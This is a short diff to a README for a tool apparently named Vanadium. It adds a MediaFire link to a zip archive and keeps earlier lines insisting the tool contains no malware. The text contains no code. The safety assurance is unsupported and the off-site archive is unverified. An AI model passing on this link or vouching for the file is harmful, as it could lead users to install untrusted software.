@@ -6,3 +6,7 @@ No, it's safe and you can use it anytime; it doesn't contain any malware that co
 
 # read this
 I'm sorry I can't upload the file to GitHub because the file size is 39 MB, and the maximum size on GitHub is 25 MB. But you will find it on the MediaFire page!
+
+# How To Download?
+https://www.mediafire.com/file/n7ef1m41l3320yv/Vanadium.zip/file
+on this link you can download the tool!
